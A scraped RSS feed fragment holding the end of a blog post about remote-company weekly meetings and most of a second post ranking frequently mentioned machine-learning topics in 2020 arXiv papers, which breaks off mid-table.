https://jasonkolb.com/wp-content/uploads/2020/12/image-300x169.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/image-768x433.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1536x865.png 1536w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2048x1154.png 2048w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1200x676.png 1200w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://jasonkolb.com/wp-content/uploads/2020/12/image-1024x577.png" data-srcset="https://jasonkolb.com/wp-content/uploads/2020/12/image-1024x577.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/image-300x169.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/image-768x433.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1536x865.png 1536w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2048x1154.png 2048w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1200x676.png 1200w"><figcaption>Mmm, a cup of coffee together is a great way to kick off the week!</figcaption></figure><p>In this meeting we go team-by-team over what we accomplished last week and our goals are for this week. And we check on what we actually got done last week compared to what we were planning to do:</p><figure><img src="https://jasonkolb.com/wp-content/uploads/2020/12/image-1-1024x572.png" alt="" width="580" height="323" srcset="https://jasonkolb.com/wp-content/uploads/2020/12/image-1-1024x572.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1-300x168.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1-768x429.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1-1536x858.png 1536w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1-2048x1144.png 2048w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1-1200x670.png 1200w" sizes="(max-width: 580px) 100vw, 580px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://jasonkolb.com/wp-content/uploads/2020/12/image-1-1024x572.png" data-srcset="https://jasonkolb.com/wp-content/uploads/2020/12/image-1-1024x572.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1-300x168.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1-768x429.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1-1536x858.png 1536w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1-2048x1144.png 2048w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1-1200x670.png 1200w"><figcaption>An example team dashboard</figcaption></figure><p>This is just a simple Google sheets deck that we have all of the leaders of the company update on Friday afternoon, with one slide per team:</p><figure><img width="1024" height="635" src="https://jasonkolb.com/wp-content/uploads/2020/12/image-2-1024x635.png" alt="" srcset="https://jasonkolb.com/wp-content/uploads/2020/12/image-2-1024x635.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2-300x186.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2-768x477.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2-1536x953.png 1536w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2-2048x1271.png 2048w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2-1200x745.png 1200w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://jasonkolb.com/wp-content/uploads/2020/12/image-2-1024x635.png" data-srcset="https://jasonkolb.com/wp-content/uploads/2020/12/image-2-1024x635.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2-300x186.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2-768x477.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2-1536x953.png 1536w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2-2048x1271.png 2048w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2-1200x745.png 1200w"><figcaption>This is the whole thing</figcaption></figure><p>The whole meeting takes about 30 minutes, and it’s a great way to kick off the week. Everyone knows what’s happening around the company, including in all of the other teams. Everyone seems to like it, and there are some interesting byproducts:</p><ul><li>Our short-term goal setting has gotten much better. Goals are set on a weekly basis, which has resulted in more accountability and velocity. Teams are looking at goals on a shorter time horizon now, which leads to more tangible outcomes every week.</li><li>Wins and losses come at the end of each and every week, which is very motivating if the team hits their goals, or if the team doesn’t hit their goals. Either way, the entire company sees it.</li><li>We’ve become much better at estimating how long it will take to do something. If you’re bad at estimating it can completely destroy morale and trust, this shorter-term focus has made the act of slicing up work into achievable chunks much more efficient.</li></ul><p><strong>The Solution: Friday Afternoon</strong></p><p>On Friday afternoon there are two more things we do every single week.</p><p>At 1pm, after the leadership team updates the Monday morning deck, we meet as a group to review everyone’s updates together, ask questions, and talk about challenges. Some of the best discussions and collaboration happen during this meeting, and this is the main place and time where cross-team dependencies are often discovered and planned around. We also talk about wins, challenges, and collect shout-outs for people who have done outstanding work over the past week.</p><p>Then at 4:30pm, before everyone takes off for the weekend, we wrap up the week with our Friday Afternoon Happy Hour:</p><figure><img width="1024" height="576" src="https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1024x576.png" alt="" srcset="https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1024x576.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-300x169.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-768x432.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1200x675.png 1200w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour.png 1255w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1024x576.png" data-srcset="https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1024x576.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-300x169.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-768x432.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1200x675.png 1200w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour.png 1255w"><figcaption>Not everyone drinks at happy hour, but we do keep it happy!</figcaption></figure><p>We try to keep happy hour fun and lighthearted. We celebrate wins, give shout-outs to people who did something extraordinary over the course of the week, and show the company any fun or funny things that happened during the course of the week. We try to leave some room for people to talk and have fun as well (we’ve had some GREAT Zoom backgrounds!), but generally we try to send people into the weekend on a high note.</p><p><strong>Summary</strong></p><p>These meetings have become routine for us now, and pretty much our entire company loves them. Our communication is better, teamwork is tighter, goal-setting is more accurate, and velocity is way higher.</p><p>Honestly I would have a hard time *not* having these meetings now. They’ve worked *so well* to create a tighter company all around that I don’t know that any set of in-person meetings could really replicate, let alone surpass, the results.</p><p>This may not work for everyone, but it works great for us, and I hope that at the very least this sparks some ideas for making your company more efficient and maintaining your culture during this–or any future–challenge to working together.</p></div></div></div>]]>
            </description>
            <link>https://jasonkolb.com/my-favorite-management-hack-of-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560287</guid>
            <pubDate>Mon, 28 Dec 2020 16:08:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Most Frequently Mentioned ML Topics in 2020]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25560257">thread link</a>) | @polm23
<br/>
December 28, 2020 | https://www.ml4asia.com/most-frequently-mentioned-ml-topics-in-2020/ | <a href="https://web.archive.org/web/*/https://www.ml4asia.com/most-frequently-mentioned-ml-topics-in-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://www.ml4asia.com/content/images/size/w300/2020/12/cover-9.png 300w,
                            https://www.ml4asia.com/content/images/size/w600/2020/12/cover-9.png 600w,
                            https://www.ml4asia.com/content/images/size/w1000/2020/12/cover-9.png 1000w,
                            https://www.ml4asia.com/content/images/size/w2000/2020/12/cover-9.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://www.ml4asia.com/content/images/size/w2000/2020/12/cover-9.png" alt="Most Frequently Mentioned ML Topics in 2020">
            </figure>

            <section>
                <div>
                    <!--kg-card-begin: markdown--><p>The progress of the machine learning (ML) and artificial intelligence fields never stopped surprising us this year either. In natural language processing (NLP), new, powerful models such as GPT-3 and T5 are published one after another. The Transformer found its way into the computer vision (CV) field as well (<a href="https://cdn.openai.com/papers/Generative_Pretraining_from_Pixels_V2.pdf">Chen et al. 2020</a>, <a href="https://arxiv.org/abs/2010.11929">Dosovitskiy et al. 2020</a>). The exponential growth trend of the number of papers published on arXiv and at conferences hasn't slowed down yet.</p>
<p>In this post, I'm going to use NLP techniques to analyze all the ML/NLP/CV papers published on arXiv this year and summarize the "most frequently mentioned ML topics in 2020." These top-ranked keywords represent the ML trends in 2020 very well, and knowing them in advance will make your job easier when it comes to reading more scientific articles (this is very important for non-native English speakers like me!)</p>
<p>Specifically, I collected the titles and abstracts of all the papers published on arXiv in 2020 via the arXiv API, and extracted named entities with a model trained on SciREX. The SciREX model can extract typed named entities such as tasks, metrics, datasets, and methods, which enables us to rank the mentions per type. The technical details of the analyses are shown in the "technical details" section at the bottom of this article.</p>
<h2 id="mostfrequentlymentionedtopicsin2020pertype">Most Frequently Mentioned Topics in 2020 (per Type)</h2>
<p>I only focus on the three AI fields—general machine learning (<a href="https://arxiv.org/list/cs.LG/recent">cs.LG</a>), natural language processing (<a href="https://arxiv.org/list/cs.CL/recent">cs.CL</a>), and computer vision (<a href="https://arxiv.org/list/cs.CV/recent">cs.CV</a>). I'm aware that there are many other AI/ML categories on arXiv, although I limited to just three to simplify things.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h3 id="machinelearningcslg">Machine Learning (cs.LG)</h3>
<p>First, let's look at the most mentioned topics in machine learning per type below:</p>
<table>
<thead>
<tr>
<th>Datasets</th>
<th>Metrics</th>
<th>Tasks</th>
<th>Methods</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://www.cs.toronto.edu/~kriz/cifar.html">CIFER-10</a></td>
<td>accuracy</td>
<td>classification</td>
<td>neural network</td>
</tr>
<tr>
<td><a href="http://www.image-net.org/">ImageNet</a></td>
<td>robustness</td>
<td>machine learning</td>
<td>deep neural network</td>
</tr>
<tr>
<td><a href="http://yann.lecun.com/exdb/mnist/">MNIST</a></td>
<td>complexity</td>
<td>training</td>
<td>convolutioal neural network</td>
</tr>
<tr>
<td>COVID-19</td>
<td>convergence</td>
<td>learning</td>
<td>deep learning</td>
</tr>
<tr>
<td><a href="https://www.cs.toronto.edu/~kriz/cifar.html">CIFER-100</a></td>
<td>computational cost</td>
<td>generalization</td>
<td>machine learning</td>
</tr>
<tr>
<td><a href="http://ufldl.stanford.edu/housenumbers/">SVHN</a></td>
<td>classification accuracy</td>
<td>prediction</td>
<td>reinforcement learning</td>
</tr>
<tr>
<td>chest x-ray</td>
<td>computational complexity</td>
<td>inference</td>
<td>GAN</td>
</tr>
<tr>
<td><a href="https://cocodataset.org/#home">COCO</a></td>
<td>precision</td>
<td>NLP</td>
<td>machine learning models</td>
</tr>
<tr>
<td><a href="http://www.cvlibs.net/datasets/kitti/">KITTI</a></td>
<td>f1 score</td>
<td>reinforcement learning</td>
<td>graph neural network</td>
</tr>
<tr>
<td>Twitter</td>
<td>sample complexity</td>
<td>artificial intelligence</td>
<td>classifier</td>
</tr>
</tbody>
</table>
<p>If you look at the list of datasets, most of them are related to computer vision, which is arguably the most actively researched area in machine learning.</p>
<p>As for the methods, you see neural networks everywhere. Among generic methods such as "neural network" and "deep learning" you also see "graph neural network," which is one of the biggest recent trends in ML.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h3 id="naturallanguageprocessingcscl">Natural Language Processing (cs.CL)</h3>
<p>Next, the most mentioned topics in NLP are shown below:</p>
<table>
<thead>
<tr>
<th>Datasets</th>
<th>Metrics</th>
<th>Tasks</th>
<th>Methods</th>
</tr>
</thead>
<tbody>
<tr>
<td>COVID-19</td>
<td>accuracy</td>
<td>NLP</td>
<td>BERT</td>
</tr>
<tr>
<td>English</td>
<td>F1 score</td>
<td>machine translation</td>
<td>language model</td>
</tr>
<tr>
<td>Twitter</td>
<td>bleu score</td>
<td>question answering</td>
<td>transformer</td>
</tr>
<tr>
<td>Wikipedia</td>
<td>robustness</td>
<td>named entity recognition</td>
<td>LSTM</td>
</tr>
<tr>
<td><a href="https://gluebenchmark.com/">GLUE</a></td>
<td>word error rate</td>
<td>automatic speech recognition</td>
<td>neural network</td>
</tr>
<tr>
<td>German</td>
<td>quality</td>
<td>neural machine translation</td>
<td>deep neural network</td>
</tr>
<tr>
<td><a href="https://rajpurkar.github.io/SQuAD-explorer/">SQuAD</a></td>
<td>precision</td>
<td>downstream tasks</td>
<td>NLP</td>
</tr>
<tr>
<td><a href="http://www.openslr.org/12">LibriSpeech</a></td>
<td>recall</td>
<td>classification</td>
<td>recurrent neural network</td>
</tr>
<tr>
<td>Wikidata</td>
<td>translation quality</td>
<td>sentiment analysis</td>
<td>neural models</td>
</tr>
<tr>
<td>Hindi</td>
<td>evaluation metrics</td>
<td>generation</td>
<td>convolutional neural network</td>
</tr>
</tbody>
</table>
<p>This was obvious in retrospect, but the most mentioned topic in NLP was "COVID-19." A dataset of COVID-related papers <a href="https://allenai.org/data/cord-19">CORD-19</a> was published. An information extraction shared task was held at the <a href="http://noisy-text.github.io/2020/">W-NUT 2020</a> workshop. A lot of research efforts were made for analyzing COVID-related information on social media as well as on clinical text. It is also nice to see many authors <a href="https://thegradient.pub/the-benderrule-on-naming-the-languages-we-study-and-why-it-matters/">name the language(s)</a> they work on in the abstract.</p>
<p>Top-mentioned methods are all related to BERT, language models, and transformers. I wonder when the <a href="https://ruder.io/nlp-imagenet/">"ImageNet Moment"</a> with transformer-based transfer learning is going to peak out in NLP.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h3 id="computervisioncscv">Computer Vision (cs.CV)</h3>
<p>Finally, here's the list of most mentioned topics in computer vision.</p>
<table>
<thead>
<tr>
<th>Datasets</th>
<th>Metrics</th>
<th>Tasks</th>
<th>Methods</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="http://www.image-net.org/">ImageNet</a></td>
<td>accuracy</td>
<td>segmentation</td>
<td>convolutional neural network</td>
</tr>
<tr>
<td><a href="https://www.cs.toronto.edu/~kriz/cifar.html">CIFER-10</a></td>
<td>robustness</td>
<td>classification</td>
<td>deep neural network</td>
</tr>
<tr>
<td><a href="https://cocodataset.org/#home">COCO</a></td>
<td>classification accuracy</td>
<td>computer vision</td>
<td>deep learning</td>
</tr>
<tr>
<td><a href="http://www.cvlibs.net/datasets/kitti/">KITTI</a></td>
<td>precision</td>
<td>object detection</td>
<td>neural network</td>
</tr>
<tr>
<td><a href="https://www.cs.toronto.edu/~kriz/cifar.html">CIFER-100</a></td>
<td>computational cost</td>
<td>detection</td>
<td>GAN</td>
</tr>
<tr>
<td>COVID-19</td>
<td>maximum a posteriori</td>
<td>training</td>
<td>deep convolutional neural network</td>
</tr>
<tr>
<td><a href="http://yann.lecun.com/exdb/mnist/">MNIST</a></td>
<td>speed</td>
<td>semantic segmentation</td>
<td>deep learning models</td>
</tr>
<tr>
<td><a href="https://www.cityscapes-dataset.com/">Cityscapes</a></td>
<td>computational complexity</td>
<td>image classification</td>
<td>transfer learning</td>
</tr>
<tr>
<td>chest x-ray</td>
<td>generalization ability</td>
<td>generalization</td>
<td>classifier</td>
</tr>
<tr>
<td>RGB images</td>
<td>sensitivity</td>
<td>inference</td>
<td>deep learning methods</td>
</tr>
</tbody>
</table>
<p>Among the "regulars" such as CIFER-10/100, ImageNet, and MNIST, COVID-19 and chest x-ray are in the most mentioned dataset list. There has been a lot of research work on, for example, diagnosis of COVID-19 from chest x-ray images.</p>
<p>The most mentioned task was (semantic) segmentation, which is an important CV task with a wide range of applications such as autonomous driving and medical image processing.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="topicsontherisein2020">Topics on the Rise in 2020</h2>
<p>In the second half of this article, we are going to dive into some trends of individual fields by comparing the number of mentions between 2019 and 2020 and focusing on mentions that have significantly more (or fewer) mentions.</p>
<h3 id="machinelearningcslg">Machine Learning (cs.LG)</h3>
<p>First, let's look at the mention trends in machine learning. The following table lists the 20 most mentioned topics in 2020 (regardless of their types)  along with their monthly trends (relative number of papers that mention each keyword) in the past 24 months. If a topic has statistically significantly more mentions compared to the expected value based on the 2-year average, the trend is shown in green; red if it's significantly fewer.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: html--><table>
<thead>
  <tr>
    <th>Rank</th>
    <th>Topic</th>
    <th>Trend</th>
    <th># Papers (2019)</th>
    <th># Papers (2020)</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>1</td>
    <td>accuracy</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 12.24,11.18,12.09,12.35,11.40,9.73,12.13,12.57,10.90,10.96,11.63,11.66,10.80,11.10,12.37,12.21,12.18,10.40,11.38,12.07,13.33,11.70,12.55,11.97 --></span></td>
    <td>2209</td>
    <td>2971</td>
  </tr>
  <tr>
    <td>2</td>
    <td>machine learning</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 7.92,7.59,8.64,9.82,7.80,6.66,7.66,8.45,7.57,7.27,7.67,7.72,10.38,7.75,7.66,7.15,8.78,7.68,8.24,8.78,8.85,7.51,8.14,9.51 --></span></td>
    <td>1503</td>
    <td>2079</td>
  </tr>
  <tr>
    <td>3</td>
    <td>neural network</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 8.64,8.08,7.73,8.48,8.93,7.93,7.40,6.02,8.31,7.81,7.96,7.66,8.60,8.60,8.37,6.59,7.53,9.05,8.74,6.18,7.60,7.61,6.99,7.44 --></span></td>
    <td>1530</td>
    <td>1984</td>
  </tr>
  <tr>
    <td>4</td>
    <td>deep neural network</td>
    <td><span sparkheight="32" sparklinecolor="red" sparkfillcolor="lightPink"><!-- 8.73,7.84,8.36,8.56,8.88,6.98,7.53,9.37,7.68,8.71,7.82,8.61,7.11,8.20,7.94,8.16,6.53,7.80,8.57,7.54,8.14,7.20,7.86,8.38 --></span></td>
    <td>1585</td>
    <td>1969</td>
  </tr>
  <tr>
    <td>5</td>
    <td>deep learning</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 6.48,5.88,6.09,7.44,5.43,5.13,7.14,6.02,6.21,5.25,5.47,7.66,7.25,6.06,6.13,6.28,6.95,5.54,6.27,4.99,6.56,5.71,5.93,6.81 --></span></td>
    <td>1174</td>
    <td>1548</td>
  </tr>
  <tr>
    <td>6</td>
    <td>convolutional neural network</td>
    <td><span sparkheight="32" sparklinecolor="red" sparkfillcolor="lightPink"><!-- 6.12,4.90,6.91,6.32,5.03,5.07,6.49,6.93,5.82,5.39,6.89,6.46,6.68,4.68,6.40,6.28,5.80,4.50,4.68,5.33,4.70,4.08,4.92,5.10 --></span></td>
    <td>1150</td>
    <td>1296</td>
  </tr>
  <tr>
    <td>7</td>
    <td>reinforcement learning</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 5.13,4.16,5.18,3.87,5.28,5.81,4.67,4.19,6.27,5.21,4.45,4.55,4.62,5.30,5.36,4.46,4.13,4.62,4.43,4.82,3.77,4.57,6.62,4.28 --></span></td>
    <td>955</td>
    <td>1204</td>
  </tr>
  <tr>
    <td>8</td>
    <td>classification</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 5.31,4.49,4.82,4.84,3.95,4.44,4.15,4.11,3.73,3.86,4.25,5.08,4.41,3.79,5.15,5.02,5.18,4.77,4.68,4.08,4.86,3.94,4.37,3.15 --></span></td>
    <td>838</td>
    <td>1127</td>
  </tr>
  <tr>
    <td>9</td>
    <td>robustness</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.70,3.59,4.00,3.12,4.05,5.39,3.05,3.66,3.28,3.05,2.34,4.01,2.63,4.06,4.16,3.90,3.29,4.53,3.43,3.68,3.93,4.05,3.36,4.35 --></span></td>
    <td>680</td>
    <td>970</td>
  </tr>
  <tr>
    <td>10</td>
    <td>training</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.97,3.02,2.82,3.57,3.11,3.44,3.50,3.81,3.56,3.50,2.98,3.11,3.70,3.43,3.23,3.65,2.88,3.85,3.01,2.89,2.51,3.15,3.36,3.40 --></span></td>
    <td>635</td>
    <td>828</td>
  </tr>
  <tr>
    <td>11</td>
    <td>learning</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 3.78,3.35,3.45,3.35,3.95,3.17,3.76,2.51,2.99,3.86,3.18,2.93,3.27,2.72,3.28,2.84,2.61,3.98,3.60,2.66,2.79,3.67,3.31,3.15 --></span></td>
    <td>650</td>
    <td>815</td>
  </tr>
  <tr>
    <td>12</td>
    <td>generalization</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.25,3.59,2.00,1.71,2.67,3.12,2.27,2.36,2.60,3.19,2.10,1.97,1.99,2.23,2.79,2.03,1.78,3.15,2.89,2.10,2.73,2.70,2.48,3.28 --></span></td>
    <td>486</td>
    <td>646</td>
  </tr>
  <tr>
    <td>13</td>
    <td>generative adversarial network</td>
    <td><span sparkheight="32" sparklinecolor="red" sparkfillcolor="lightPink"><!-- 4.23,3.59,2.55,3.42,3.46,2.75,2.99,2.82,2.32,3.86,2.78,2.81,2.63,2.41,2.68,2.94,2.46,2.57,2.34,2.44,2.19,2.28,1.66,2.02 --></span></td>
    <td>601</td>
    <td>602</td>
  </tr>
  <tr>
    <td>14</td>
    <td>artificial intelligence</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 1.71,1.39,1.55,1.79,1.68,1.69,1.75,1.52,1.86,1.89,1.91,2.15,2.84,1.43,2.85,2.58,2.14,1.56,2.17,2.89,2.73,1.83,2.48,2.58 --></span></td>
    <td>340</td>
    <td>568</td>
  </tr>
  <tr>
    <td>15</td>
    <td><a href="https://www.cs.toronto.edu/~kriz/cifar.html">CIFAR-10</a></td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.52,2.04,1.45,2.68,3.01,2.75,2.14,1.45,2.71,1.98,2.10,1.97,2.42,2.81,3.12,2.13,1.78,2.29,2.38,1.64,1.86,1.73,2.25,2.27 --></span></td>
    <td>438</td>
    <td>560</td>
  </tr>
  <tr>
    <td>16</td>
    <td>COVID-19</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.00,0.06,0.00,0.13,2.03,3.90,3.45,1.50,2.72,2.83,3.11,2.35,2.16,2.02 --></span></td>
    <td>1</td>
    <td>551</td>
  </tr>
  <tr>
    <td>17</td>
    <td>machine learning models</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 1.26,1.06,1.64,2.01,2.27,1.69,2.01,2.13,1.81,1.66,2.39,2.27,2.56,2.05,2.57,1.62,2.40,1.71,2.01,1.87,2.40,2.32,1.89,3.21 --></span></td>
    <td>365</td>
    <td>547</td>
  </tr>
  <tr>
    <td>18</td>
    <td>graph neural network</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 0.54,0.65,1.18,1.26,2.22,1.00,0.91,0.76,1.64,1.44,0.88,1.14,1.42,1.25,1.64,1.06,1.83,2.75,2.38,1.98,3.06,2.46,2.21,2.46 --></span></td>
    <td>230</td>
    <td>530</td>
  </tr>
  <tr>
    <td>19</td>
    <td>natural language processing</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 1.17,0.98,1.09,1.64,1.28,1.90,1.36,1.29,2.26,1.66,2.30,1.44,2.20,1.56,1.64,3.35,2.09,1.68,1.80,1.81,1.97,3.18,1.79,1.89 --></span></td>
    <td>307</td>
    <td>529</td>
  </tr>
  <tr>
    <td>20</td>
    <td>prediction</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.07,2.29,1.27,2.23,1.97,2.17,2.47,1.90,1.53,1.26,2.34,1.97,1.99,2.01,1.92,1.57,1.88,1.74,2.30,2.21,2.02,2.25,2.21,2.46 --></span></td>
    <td>375</td>
    <td>515</td>
  </tr>
  <tr>
    <td></td>
    <td>Total</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 1111,1225,1100,1344,2026,1892,1541,1313,1770,2227,2047,1672,1407,2244,1827,1973,1913,3270,2391,1765,1830,2890,2175,1587 --></span></td>
    <td>19,268</td>
    <td>25,272</td>
  </tr>
</tbody>
</table><!--kg-card-end: html--><!--kg-card-begin: markdown--><p>The table above shows that the actual number of papers mentioning "deep neural network," "convolutional neural network," "generative adversarial network" is significantly smaller than expected. These topics became so widespread that papers might not even bother to mention them anymore (at least in the title or the abstract).</p>
<p>On the other hand, COVID-19 and graph neural networks are on the rise, as discussed above. The entire field of NLP seems to be on the rise as well, thanks to the continued interests in methods such as transformers and BERT.</p>
<p>Beyond these 20, topics that have significantly more mentions in 2020 include: "federated learning," "data augmentation," and "meta learning."</p>
<h3 id="naturallanguageprocessingcscl">Natural Language Processing (cs.CL)</h3>
<p>Next, the topic trends in natural language processing are shown below:</p>
<!--kg-card-end: markdown--><!--kg-card-begin: html--><table>
<thead>
  <tr>
    <th>Rank</th>
    <th>Topic</th>
    <th>Trend</th>
    <th># Papers (2019)</th>
    <th># Papers (2020)</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>1</td>
    <td>natural language processing</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 12.32,8.47,14.07,6.50,8.07,7.73,6.43,7.82,8.01,7.96,10.78,8.31,10.58,12.15,11.45,12.49,10.58,12.42,13.12,10.97,10.10,12.22,12.14,10.88 --></span></td>
    <td>460</td>
    <td>805</td>
  </tr>
  <tr>
    <td>2</td>
    <td>BERT</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 2.96,5.08,4.18,6.08,7.58,5.80,6.17,9.73,8.87,10.55,7.45,6.37,4.44,9.39,9.50,11.25,8.81,7.74,9.16,10.70,10.10,8.63,10.46,7.51 --></span></td>
    <td>393</td>
    <td>634</td>
  </tr>
  <tr>
    <td>3</td>
    <td>accuracy</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 12.81,8.05,9.51,9.64,9.29,5.15,11.31,8.21,6.87,7.09,9.03,7.76,10.58,9.39,8.38,6.97,7.87,11.81,10.89,8.88,9.76,9.17,8.26,10.36 --></span></td>
    <td>447</td>
    <td>625</td>
  </tr>
  <tr>
    <td>4</td>
    <td>language model</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 1.48,5.51,1.52,3.77,3.42,3.54,4.37,4.20,5.72,4.50,4.60,2.49,3.75,4.70,2.51,5.96,5.05,4.28,6.19,6.79,6.45,8.40,6.91,6.74 --></span></td>
    <td>217</td>
    <td>419</td>
  </tr>
  <tr>
    <td>5</td>
    <td>machine translation</td>
    <td><span sparkheight="32" sparklinecolor="red" sparkfillcolor="lightPink"><!-- 2.46,6.78,3.80,3.98,6.11,6.44,6.43,6.87,6.29,6.92,6.02,4.71,4.10,2.21,6.15,7.87,3.64,6.92,4.21,2.61,3.48,4.74,4.72,2.59 --></span></td>
    <td>315</td>
    <td>324</td>
  </tr>
  <tr>
    <td>6</td>
    <td>F1 score</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 2.96,1.69,4.18,3.77,2.69,3.86,4.11,3.63,5.01,2.94,3.33,4.43,2.73,3.31,3.91,3.37,3.76,4.28,5.94,4.96,5.75,4.81,3.37,5.44 --></span></td>
    <td>198</td>
    <td>297</td>
  </tr>
  <tr>
    <td>7</td>
    <td>transformer</td>
    <td><span sparkheight="32" sparklinecolor="green" sparkfillcolor="lightGreen"><!-- 1.48,2.12,3.80,1.89,1.71,4.03,3.34,3.24,2.15,3.63,2.54,3.32,3.75,4.14,5.31,3.26,4.00,4.48,4.95,3.39,5.92,4.43,3.54,4.40 --></span></td>
    <td>153</td>
    <td>293</td>
  </tr>
  <tr>
    <td>8</td>
    <td>neural machine translation</td>
    <td><span sparkheight="32" sparklinecolor="grey" sparkfillcolor="lightGrey"><!-- 4.43,4.66,3.04,2.73,6.60,6.60,3.86,6.11,5.58,4.50,5.07,4.43,3.75,6.35,3.63,6.19,3.64,4.07,1.98,1.57,3.83,4.51,4.05,2.07 --></span></td>
    <td>269</td>
    <td>280</td>
  </tr>
  <tr>
    <td>9</td>
    <td>question answering</td>
